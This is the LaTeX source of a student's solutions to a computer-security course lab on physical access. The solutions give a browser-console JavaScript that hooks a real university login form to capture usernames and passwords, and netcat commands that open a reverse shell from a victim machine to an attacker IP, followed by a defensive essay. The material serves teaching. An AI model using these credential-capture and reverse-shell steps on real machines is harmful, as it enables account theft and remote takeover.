\documentclass[a4paper, 10pt]{article}
\usepackage{scrextend}
\changefontsizes{9pt}
% Per-subject config for this repo. See vendor/template/course-config.tex.example
% for what each macro is used for.

\newcommand{\CourseCode}{2110413}
\newcommand{\CourseName}{Computer Security}
\newcommand{\StudentID}{6733172621}
\newcommand{\StudentName}{Patthadon Phengpinij}
\newcommand{\DefaultCollaborators}{Claude (for\,\LaTeX\,styling and grammar checking)}
\newcommand{\AssignmentLabel}{Activity}

\usepackage{../vendor/template/CEDT-Assignment-style}

\begin{document}
\subject
\asgntitle{8}{}{Physical Security}{}{\DefaultCollaborators}

% ================================================================================ %
\section{Overview}
% ================================================================================ %

\begin{flushright}
	\textit{``Physical access can be really dangerous.''} \\
	Krerk Piromspa, Ph.D.
\end{flushright}

\begin{minipage}[c]{0.70\linewidth}
	\noindent In this activity, you will learn how bad physical access can be.

	\myspace

	\noindent Assuming that your friend leaves a computer unattended in a public library, you (as a hacker here) have a chance to sit in front of his/her computer for a few seconds.
	There will be two scenarios.
	First scenario is to inject javascript to his/her browser so that you can obtain his/her password to ChulaId.
	Second scenario is to mimic an attack that allows a hacker to get a reverse shell attack to the victim's machine.
\end{minipage}%
\hfill
\begin{minipage}[c]{0.20\linewidth}
	\fig*[\linewidth]{images/physical-security.png}{}{}
\end{minipage}

% ================================================================================ %
\section{Exercise}
% ================================================================================ %

% ================================================================================ %
%                                    Problem 01                                    %
% ================================================================================ %
\begin{problem}
\textbf{Javascript Injection.}
Your friend has just logged out of ChulaSSO (\url{https://account.it.chula.ac.th/}) before leaving his/her computer.
You have 2-3 minutes to inject a script to his/her browser so that you can steal his/her username (ChulaId) and password.

\par For this class, please inject a javascript so that once your friend login (clicks the login button), it will pop up his/her username/password.

\fig*[0.6\linewidth]{images/javascript-injection.png}{}{}
\end{problem}

\begin{solution}
	\noindent \textbf{Idea.} With a few seconds of physical access, open the browser's developer
	console on the already-loaded ChulaSSO login page and paste a short script. The script hooks the
	login form so that, the moment your friend submits (clicks \emph{Login}), it reads the values
	still sitting in the username and password fields and pops them up. Nothing leaves the machine
	here --- a local \texttt{alert} is enough to prove the credentials were captured.

	\myspace

	\noindent \textbf{Step 1 --- open the console.} On the login page (\url{https://account.it.chula.ac.th/}),
	press \texttt{F12} (or \texttt{Ctrl+Shift+I} / \texttt{Cmd+Opt+I} on macOS) and select the
	\textbf{Console} tab.

	\myspace

	\noindent \textbf{Step 2 --- paste and run this script.} On the ChulaSSO page the fields carry
	the ids \texttt{login\_username} and \texttt{login\_password}, so the script targets those
	directly and falls back to a generic lookup only if they are ever renamed.

	\myspace

	\begin{codingbox*}[numbers=none, breaklines=true, basicstyle=\ttfamily\footnotesize\color{editortext}]
var user = document.getElementById('login_username')
        || document.querySelector('input[type="text"], input[type="email"]');
var pwd  = document.getElementById('login_password')
        || document.querySelector('input[type="password"]');
var form = pwd ? pwd.closest('form') : document.querySelector('form');

form.addEventListener('submit', function () {
    alert(
			'Captured credentials\n' +
      'Username: ' + (user ? user.value : '(not found)') + '\n' +
      'Password: ' + (pwd  ? pwd.value  : '(not found)')
		);
}, true);
\end{codingbox*}

	\myspace

	\noindent The \texttt{true} (capture-phase) argument matters: \texttt{alert()} is synchronous and
	blocks the thread, so the popup appears \emph{before} the browser leaves the page to process the
	login.

	\myspace

	\noindent \textbf{Step 3 --- wait.} Leave the page as-is. When your friend returns and logs in,
	the alert fires showing their ChulaId and password.

	\myspace

	\noindent \textbf{Important caveat.} A console-injected script lives only for the \emph{current page load}.
	It works precisely because the victim logs in on the same loaded page within the
	2--3 minute window; if the page is reloaded or navigated, the script is gone and must be
	re-injected. (In a real attack the adversary would instead persist via a malicious extension or
	exfiltrate silently to a server; here a local popup is deliberately used so no data leaves the
	machine.)

	\fig[0.9\linewidth]{images/sol-1-popup.png}{Captured credentials shown by the injected script.}{fig:sol1}
\end{solution}
% ================================================================================ %

% ================================================================================ %
%                                    Problem 02                                    %
% ================================================================================ %
\begin{problem}
We will mimic an attack used by several worms for placing a trojan horse into your computer.
Please note that it is for demonstration purposes only.
Please do not abuse it.
This attack is partly taken from the MSSQL SLAMMER worm that was spread in 2006.

\par\noindent Please install netcat.
\begin{itemize}
	\item Mac - use homebrew (\url{https://brew.sh/}). \\
	      \texttt{brew install netcat}
	\item Windows - use cygwin or download prebuilt binary \\
	      (\url{https://joncraton.org/blog/46/netcat-for-windows/})
	\item Linux - you may install netcat from your package distribution. \\
	      (On Debian-based Linux, use \texttt{apt install netcat-traditional})
\end{itemize}

\par Make a group of two persons. One is a victim. Another is an attacker.
Please connect to the same network/WIFI access point.
You may share a hotspot from your mobile phone. (Don't use ChulaWIFI for this.)
You may have to turn off your firewall to do this experiment.

\myspace

\par\noindent First, the attacker will start netcat in listen mode.
\begin{codingbox}[language=bash]
$ nc -p 60000 -l
$
\end{codingbox}

\par\noindent Once you get a change to the victim's machine, send a remote shell back to the hacker.
\begin{codingbox}[language=bash]
$ nc -e [/bin/bash or cmd.exe on Windows] [IP of Hacker] 60000
$
\end{codingbox}

\par\noindent You may change the port 60000 to any port that you want.
\end{problem}

\begin{solution}
	\noindent \textbf{Setup.} Two machines on the same network (e.g.\ a phone hotspot), firewalls off
	for the experiment. Here \textbf{A} is the attacker at IP \texttt{192.168.x.A} and \textbf{V} is
	the victim. Find A's IP first with \texttt{ip addr} (Linux), \texttt{ifconfig} (macOS), or
	\texttt{ipconfig} (Windows).

	\myspace

	\noindent \textbf{Which netcat do I have?} This matters, because the \texttt{-e} flag in the
	assignment only exists in \textbf{netcat-traditional}. The default \texttt{nc} on macOS and most
	current Linux is \textbf{netcat-openbsd}, which has \emph{no} \texttt{-e} flag and a slightly
	different listen syntax. Check with \texttt{nc -h} and use the matching column below.

	\myspace

	\noindent \textbf{Getting the traditional build (Debian/Ubuntu).} Install it, then point the
	\texttt{nc} command at it. On many systems \emph{both} builds are present and the
	\texttt{update-alternatives} system decides which one \texttt{nc} runs:
	\myspace
	\begin{codingbox*}[numbers=none, basicstyle=\ttfamily\footnotesize\color{editortext}]
$ sudo apt install netcat-traditional         # provides /usr/bin/nc.traditional
$ sudo update-alternatives --config nc        # pick the nc.traditional entry
$ nc -h 2>&1 | head -1                        # verify: should mention [-e filename]
$
\end{codingbox*}
	\myspace
	\noindent Alternatively, skip the switch and call the binary directly as
	\texttt{nc.traditional} wherever the commands below say \texttt{nc}. To go back later:
	\texttt{sudo update-alternatives --set nc /usr/bin/nc.openbsd}.

	\myspace

	\noindent \textbf{Step 1 --- attacker listens} (on A):
	\myspace
	\begin{codingbox*}[numbers=none, basicstyle=\ttfamily\footnotesize\color{editortext}]
# netcat-traditional:                 # netcat-openbsd:
A$ nc -l -p 60000                     A$ nc -l 60000
\end{codingbox*}

	\myspace

	\noindent \textbf{Step 2 --- victim connects back} (on V).
	This is the line a worm/trojan would run automatically once it reaches the victim:
	\myspace
	\begin{codingbox*}[numbers=none, breaklines=true, basicstyle=\ttfamily\footnotesize\color{editortext}]
# netcat-traditional (has -e):
V$ nc -e /bin/bash 192.168.x.A 60000        # Linux/macOS
V$
V> nc -e cmd.exe   192.168.x.A 60000        # Windows
\end{codingbox*}

	\myspace

	\noindent \textbf{Step 3 --- attacker now has a shell.} Back in A's listener terminal you are
	typing commands that run on V. Confirm whose machine you are on:

	\myspace

	\begin{codingbox*}[numbers=none, basicstyle=\ttfamily\footnotesize\color{editortext}]
A$ whoami        # -> the victim's user
A$ hostname      # -> the victim's host
A$ id ; uname -a # proof the commands execute on V, not A
A$
\end{codingbox*}

	\newpage

	\noindent \textbf{Why this is the SLAMMER-style lesson.} The victim's single command dials
	\emph{out} to the attacker and hands over an interactive shell. Because the connection is
	outbound, it sails through most home NAT/firewalls that only block inbound connections --- which
	is exactly why reverse shells are the payload of choice for worms and trojans.

	\fig[0.8\linewidth]{images/sol-2-shell.png}{Attacker's terminal running commands on the victim via the reverse shell.}{fig:sol2}
\end{solution}
% ================================================================================ %

% ================================================================================ %
%                                    Problem 03                                    %
% ================================================================================ %
\begin{problem}
Write an essay to summarize the lesson that you have learned in this activity.
In particular,
\begin{subproblems_alpha}
	\item explain the worst case scenario that can happen if you leave your computer unattended.
	\item explain how a tool like netcat can be used for constructing a trojan horse.
	      As a user, how will you prevent yourself from being a victim to such attacks?
\end{subproblems_alpha}
\end{problem}

\begin{solution}
	\noindent \textbf{(a) Worst case of an unattended computer.} If the machine is left logged-in
	and unlocked, a few seconds is enough for total compromise. As in Problem~1, an attacker can
	inject a script to harvest credentials; as in Problem~2, they can plant a reverse shell that
	gives them persistent remote control. From there: read and exfiltrate every file, send mail and
	impersonate you, pivot to other systems you can reach, and install a hidden backdoor that keeps
	working long after you have walked away. Full-disk encryption and a strong login password do
	\emph{nothing} here --- the session is already unlocked. The damage is limited only by what
	\emph{you} can do on that machine, not by any seconds-long window.

	\myspace

	\noindent \textbf{(b) Netcat as a trojan horse, and how to defend.} Netcat becomes a trojan when
	its "dial home and hand over a shell" command is hidden inside something the victim is tricked
	into running --- a fake installer, a macro, an autorun file, a bundled "crack". The program does
	its advertised job while silently running \texttt{nc} in the background, giving the attacker an
	outbound reverse shell that slips past NAT/firewalls. As a user I protect myself by:
	\textbf{locking the screen} whenever I step away (\texttt{Win+L} / \texttt{Ctrl+Cmd+Q});
	\textbf{not running untrusted} executables, scripts, or macros; keeping the OS/AV/EDR updated;
	\textbf{disabling autorun} on removable media; and using an \textbf{egress (outbound) firewall}
	so unexpected connections like a shell dialing out are blocked or at least noticed.
\end{solution}
% ================================================================================ %

\end{document}
